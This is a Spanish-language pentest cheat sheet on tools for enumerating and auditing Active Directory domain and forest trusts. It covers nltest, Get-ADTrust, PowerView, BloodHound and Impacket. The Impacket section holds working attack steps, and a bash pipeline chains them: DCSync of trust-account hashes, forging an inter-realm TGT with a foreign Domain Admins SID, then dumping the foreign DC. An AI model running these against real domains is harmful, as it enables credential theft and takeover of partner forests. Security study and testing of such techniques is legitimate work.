---
aliases:
  - Trust Tooling
  - nltest
  - Get-ADTrust
  - PowerView Trusts
  - BloodHound Trusts
tags:
  - type/tool
  - vuln/ad-enumeration
  - technique/discovery
  - asset/active-directory
primary categories: null
secondary categories: null
tertiary categories: null
type: SubCheatSheet
linked:
  - '[[AD - Domain & Forest Trusts]]'
  - '[[netexec]]'
  - '[[BloodHound & SharpHound]]'
---
# AD - Domain & Forest Trusts - Tooling

***

## nltest (Native Windows)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `nltest /domain_trusts /v` | Trusts del domain con flags verbose | Quick check. |
| `nltest /domain_trusts /all_trusts /v` | Forest-wide + verbose | Comprehensive. |
| `nltest /trusted_domains` | Solo trusts directos | Subset. |
| `nltest /server:<DC> /trusted_domains` | Vistos desde DC específico | Cross-DC compare. |
| `nltest /sc_query:<dom>` | Estado secure channel | Health. |
| `nltest /sc_verify:<dom>` | Verify trust funciona | Health bidireccional. |
| `nltest /sc_reset:<dom>` | Reset secure channel (priv) | Fix trust roto. |
| `nltest /dsgetdc:<dom>` | DC closest del domain | Adjacent (resolución DC). |
| `nltest /dsgetfti` | Forest Trust Info | Forest scope. |
^ad-trusttool-nltest

```cmd
:: nltest output flag bitfield
:: 0x00000001  PRIMARY
:: 0x00000002  NATIVE
:: 0x00000004  WITHIN_FOREST
:: 0x00000008  DIRECT_OUTBOUND
:: 0x00000010  TREE_ROOT
:: 0x00000020  DIRECT_INBOUND
:: 0x00000040  FOREST_TRANSITIVE
:: 0x00000080  CROSS_ORGANIZATION
:: 0x00000100  RUNNING

:: Health verify de todos los trusts
for /f "skip=2 tokens=2 delims=:" %d in ('nltest /domain_trusts ^| findstr /i "Trusted DNS"') do nltest /sc_verify:%d
```

___

## RSAT / PowerShell

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `Get-ADTrust -Filter *` | Trusts decoded | Standard. |
| `Get-ADTrust -Filter * -Properties *` | Todos atributos | Detail completo. |
| `Get-ADTrust -Filter {Direction -eq "BiDirectional"}` | Solo bidirectional | High-risk. |
| `Get-ADTrust -Filter {TrustType -eq "Forest"}` | Solo forest trusts | Cross-forest. |
| `Get-ADTrust -Filter * -Pr trustAttributes \| Select Name,Direction,@{n='Attrs';e={'0x{0:X}' -f $_.trustAttributes}}` | Bitfield hex | Decode flags. |
| `Get-ADForest \| Select Domains,GlobalCatalogs,RootDomain` | Forest object | Forest map. |
| `Get-ADDomain -Identity <dom>` | Domain object | Per-domain detail. |
| `Get-Acl "AD:CN=<trust>,CN=System,DC=corp,DC=local"` | Trust object DACL | ACL audit. |
| `Set-ADTrust -Identity <trust> -SelectiveAuthentication $true` | Habilitar Selective Auth | Hardening fix. |
| `[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest().GetAllTrustRelationships()` | Trust via .NET | Sin RSAT. |
| `[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().GetAllTrustRelationships()` | Domain trusts via .NET | Sin RSAT. |
^ad-trusttool-rsat

```powershell
# Audit estándar
Get-ADTrust -Filter * -Properties * |
  Select Name,Direction,TrustType,IsTransitive,ForestTransitive,
         SelectiveAuthentication,SIDFilteringForestAware,SIDFilteringQuarantined,TGTDelegation
```

___

## PowerView / pywerview

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `Get-DomainTrust` | Trusts directos del domain actual | Adversary tool. |
| `Get-DomainTrustMapping` | Walk forest-wide (slow, exhaustivo) | Forest map. |
| `Get-DomainTrustMapping -API` | Walk via Win32 API (alt method) | Si LDAP bloqueado. |
| `Get-ForestTrust` | Forest-level trusts | Forest scope. |
| `Get-ForestDomain` | Domains del forest | List. |
| `Find-ForeignUser` | Users foreign en groups locales | Cross-trust enum. |
| `Find-ForeignGroup` | Groups foreign en groups locales | Cross-trust nested. |
| `Get-DomainSID` | Local SID | Para resolver foreign FSPs. |
| `Get-DomainObject -SearchBase "CN=System,DC=corp,DC=local" -LDAPFilter "(objectClass=trustedDomain)" -Properties *` | TDOs raw | Atributos completos. |
| `pywerview get-domaintrust -u u -p p -d corp.local --dc-ip <DC>` | Linux equivalent | Sin Windows. |
| `pywerview get-domaintrust-mapping -u u -p p -d corp.local --dc-ip <DC>` | Forest mapping Linux | Linux. |
^ad-trusttool-powerview

___

## BloodHound / SharpHound / RustHound

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `SharpHound.exe -c Trusts,DCOnly` | Solo trusts collection (stealth) | Targeted. |
| `SharpHound.exe -c All` | Comprehensive (incluye trusts + ACL + sessions) | Full collection. |
| `bloodhound-python -d corp.local -u u -p p -ns <DC> -c Trusts --zip` | Linux trust collection | Linux. |
| `bloodhound-python -d corp.local -u u -p p -ns <DC> -c All --zip` | Linux comprehensive | Comprehensive. |
| `rusthound -d corp.local -u u@corp.local -p pass --zip` | Rust collector | Cross-platform fast. |
| `MATCH p=(:Domain)-[r:Trusts]->(:Domain) RETURN p` | Trusts visualizados Cypher | Topology. |
| `MATCH (u {owned:true}) MATCH (target {highvalue:true}) WHERE u.domain <> target.domain MATCH p=shortestPath((u)-[*1..]->(target)) RETURN p` | Cross-trust attack paths | Path planning. |
^ad-trusttool-bh

```bash
# Multi-domain pipeline
for dom in corp.local partner.com vendor.local; do
  DC=$(dig +short SRV "_ldap._tcp.dc._msdcs.$dom" | awk '{print $4}' | head -1 | sed 's/\.$//')
  bloodhound-python -d "$dom" -u "auditor@$dom" -p 'Pass!' \
    -ns "$DC" -c All --zip -o "./loot/$dom/"
done

# Drag ZIPs en BHCE → cross-domain auto-correlate
```

___

## Impacket / Linux Trust Tools

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `impacket-lookupsid 'corp.local/u:p'@<DC> 5000` | SID enum (cross-trust) | Foreign SID resolution. |
| `secretsdump.py corp.local/admin:pass@<DC> -just-dc \| grep '\$:'` | Trust account hashes | DCSync filter. |
| `secretsdump.py corp.local/admin:pass@<DC> -just-dc-user '<NETBIOS>$'` | Solo trust account específico | Targeted. |
| `ticketer.py -nthash <trust-hash> -domain-sid <local-SID> -domain corp.local -extra-sid <foreign-DA-SID> -spn krbtgt/<foreign> Administrator` | Forge inter-realm TGT | Cross-forest forge. |
| `KRB5CCNAME=Administrator.ccache secretsdump.py -k -no-pass <foreign-DC>` | Use TGT forjado | Cross-trust pivot. |
| `getST.py -spn <SPN> -altservice <other-SPN> -dc-ip <foreign-DC> corp.local/u:p` | TGS cross-realm | S4U2Self/S4U2Proxy cross-trust. |
| `nxc ldap <DC> -u u -p p --query "(objectClass=trustedDomain)" "*"` | Trusts via netexec | Quick LDAP wrapper. |
| `windapsearch -d corp.local -u u -p p --dc-ip <DC> --trusts` | Trust enum wrapper | Linux. |
| `bloodyAD --host <DC> -d corp -u u -p p get trust` | Trust query/modify | LDAP modify Linux. |
^ad-trusttool-impacket

```bash
# Pipeline completo cross-forest forge
DC_LOCAL="dc01.corp.local"
DC_FOREIGN="dc-partner.partner.com"
LOCAL_SID=$(impacket-lookupsid 'corp.local/auditor:Pass!'@"$DC_LOCAL" 0 2>/dev/null | grep "Domain SID" | awk '{print $3}')
FOREIGN_DA_SID="S-1-5-21-FOREIGN-FOREIGN-FOREIGN-512"  # buscar via crmldap

# 1. Hash trust account
TRUST_HASH=$(impacket-secretsdump 'corp.local/da:pass'@"$DC_LOCAL" -just-dc-user 'PARTNER$' | grep PARTNER | awk -F: '{print $4}')

# 2. Forge
impacket-ticketer -nthash "$TRUST_HASH" \
  -domain-sid "$LOCAL_SID" \
  -domain corp.local \
  -extra-sid "$FOREIGN_DA_SID" \
  -spn krbtgt/partner.com \
  Administrator

# 3. Use
export KRB5CCNAME=Administrator.ccache
impacket-secretsdump -k -no-pass "$DC_FOREIGN"
```

___

## Recursos

| **Recurso** | **URL** |
|:---:|:---:|
| Will Schroeder — "A Guide To Attacking Domain Trusts" | `https://posts.specterops.io/a-guide-to-attacking-domain-trusts-ef5f8992e29e` |
| The Hacker Recipes — Trusts | `https://www.thehacker.recipes/ad/movement/trusts` |
| HackTricks Cross-Forest | `https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/cross-forest` |
| Dirk-jan Mollema blog | `https://dirkjanm.io` |
| ADSecurity Sean Metcalf | `https://adsecurity.org` |
| Microsoft KB4490425 (TGT Delegation) | `https://support.microsoft.com/help/4490425` |
| CVE-2019-1040 NetLogon | `https://msrc.microsoft.com/update-guide/vulnerability/CVE-2019-1040` |
| MITRE ATT&CK T1482 | `https://attack.mitre.org/techniques/T1482/` |
| `awesome-active-directory` | `https://github.com/Orange-Cyberdefense/awesome-activedirectory` |
^ad-trusttool-wordlists

***
